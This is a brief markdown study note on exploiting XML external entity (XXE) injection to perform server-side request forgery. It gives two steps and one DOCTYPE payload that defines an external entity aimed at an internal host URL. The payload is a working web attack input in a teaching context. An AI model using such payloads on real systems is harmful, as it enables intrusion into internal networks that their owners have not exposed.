--- ---

<h2>Exploiting XXE to Perform SSRF Attacks</h2>

- Need to do the following:
	- Define an external XML entity using the URL you want to target
	- Use the defined entity within a data value

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM " http://internal.vulnerable-
website.com/"> ]>
```